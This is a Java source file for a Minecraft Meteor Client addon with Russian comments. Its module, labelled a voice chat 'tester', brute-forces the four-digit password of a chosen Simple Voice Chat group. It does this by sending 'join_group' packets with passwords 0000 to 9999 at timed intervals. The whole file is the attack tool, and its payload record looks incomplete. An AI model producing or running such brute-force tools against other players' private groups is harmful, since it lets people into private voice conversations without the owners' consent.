package example.addon.modules;

import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.modules.Categories;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.packet.c2s.common.CustomPayloadC2sPacket;
import net.minecraft.network.PacketByteBuf;
import net.minecraft.network.codec.PacketCodec;
import net.minecraft.network.packet.CustomPayload;
import net.minecraft.util.Identifier;
import io.netty.buffer.Unpooled;
import java.util.UUID;

public class VoiceChatTester extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<Integer> maxPassword = sgGeneral.add(new IntSetting.Builder()
            .name("max-password")
            .defaultValue(9999)
            .min(1)
            .build());

    private final Setting<Integer> ticksDelay = sgGeneral.add(new IntSetting.Builder()
            .name("ticks-delay")
            .defaultValue(20)
            .min(1)
            .build());

    private final Setting<String> targetUuidString = sgGeneral.add(new StringSetting.Builder()
            .name("group-uuid")
            .defaultValue("00000000-0000-0000-0000-000000000000")
            .build());

    private int currentPassword = 0;
    private int timer = 0;
    
    // В 1.21+ идентификаторы создаются через Identifier.of()
    public static final Identifier CHANNEL_ID = Identifier.of("voicechat", "join_group");
    public static final CustomPayload.Id<SVCGroupPayload> PACKET_ID = new CustomPayload.Id<>(CHANNEL_ID);

    public VoiceChatTester() {
        super(Categories.Misc, "voice-chat-tester", "Тестирование Simple Voice Chat в 1.21.11");
    }

    @Override
    public void onActivate() {
        currentPassword = 0;
        timer = 0;
        info("Старт проверки с 0000");
    }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        if (currentPassword > maxPassword.get()) {
            info("Проверка завершена.");
            toggle();
            return;
        }

        timer++;
        if (timer >= ticksDelay.get()) {
            timer = 0;

            String passwordAttempt = String.format("%04d", currentPassword);
            
            try {
                UUID targetGroupUuid = UUID.fromString(targetUuidString.get());
                if (mc.getNetworkHandler() != null) {
                    // Создаем новый типизированный Payload 1.21.11
                    SVCGroupPayload payload = new SVCGroupPayload(targetGroupUuid, passwordAttempt);
                    // Отправляем пакет стандартным методом Minecraft
                    mc.getNetworkHandler().sendPacket(new CustomPayloadC2sPacket(payload));
                }
            } catch (IllegalArgumentException e) {
                error("Неверный формат UUID!");
                toggle();
                return;
            }
            
            currentPassword++;
        }
    }

    // Обязательная структура CustomPayload для защиты типов в 1.21.11
    public record SVCGroupPayload(UUID groupUuid, String password) implements CustomPayload {
        @Override
        public Id<? extends CustomPayload> getId() {
            return PACKET_ID;
        }
    }
}
